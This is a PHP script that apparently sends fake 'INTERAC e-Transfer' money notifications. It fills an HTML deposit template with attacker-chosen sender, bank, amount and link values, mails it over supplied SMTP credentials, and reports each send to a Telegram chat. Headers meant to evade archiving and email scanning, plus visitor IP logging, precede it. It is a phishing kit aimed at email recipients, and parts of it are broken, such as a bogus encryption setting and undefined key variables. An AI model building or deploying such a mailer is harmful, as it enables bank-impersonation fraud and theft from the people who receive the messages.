<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

// Create a new GnuPG object
$gpg = new gnupg();
$gpg->sethomedir('/usr/bin/gpg');
$private_key = file_get_contents('/usr/bin/gpg');
$gpg->adddecryptkey($fingerprint, $passphrase);
$template = file_get_contents('Deposit.html');
$message = str_replace('{{line}}', $_POST['line'], $template);
$message = str_replace('{{username}}', $_POST['username'], $template);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);
$signed_message = $gpg->setsignmode(gnupg::SIG_MODE_DETACH)->sign($message);
$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPSecure = 'tla';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port']; 
$mail->Body = $signed_message; // use signed message instead of the original message
$mail->SMTPAuth = true; 
$mail->Username = $_POST['username']; 
$mail->Password = $_POST['password']; 
$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']); 
$mail->AddAddress($_POST['receiver_email']); 
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true); 
$mail->CharSet="utf-8";
if(!$mail->Send()) {  
    echo "Mailer Error: " . $mail->ErrorInfo;
} 
$message ="INTERAC E-TRANSFER HAS BEEN SENT!";
$apiToken = "YOUR_TELEGRAM_BOT_TOKEN"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
?>